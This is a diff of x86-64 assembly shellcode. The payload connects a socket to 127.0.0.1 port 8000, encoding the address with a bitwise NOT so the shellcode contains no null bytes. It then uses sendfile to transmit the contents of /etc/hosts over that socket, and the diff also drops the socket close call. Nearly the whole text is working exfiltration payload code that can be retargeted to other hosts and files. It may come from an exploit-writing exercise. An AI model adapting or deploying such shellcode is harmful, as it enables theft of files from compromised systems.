@@ -26,17 +26,15 @@ _start:
 	xor %r10, %r10
 	xor %r11, %r11
 	push %r11
-  // 127.0.0.1
-	mov $0xfeffff80, %r10d
+
+	mov $0xfeffff80, %r10d          /* ~127.0.0.1 to exclude null bytes */
 	not %r10d
 	push %r10
-
-	pushw $0x401f
-	mov $02, %r11
+	pushw $0x401f                   /* port 8000 */
+	mov $02, %r11                   /* AF_INET */
 	push %r11w
-	//push $0x0002
 	mov $0x10, %rdx
-	lea 0(%rsp), %rsi
+	mov %rsp, %rsi
 	mov $42, %rax
 	syscall
 	pop %rdi                        /* clean the stack */
@@ -50,10 +48,6 @@ _start:
 	xor %rdx, %rdx
 	mov $0xffff, %r10               /* arbitrary number of bytes to read from /etc/hosts */
 	mov $40, %al
-	syscall
-
-	// Close socket. %rdi still contains socket fd.
-	mov $3, %rax
 	syscall
 
 	// exit
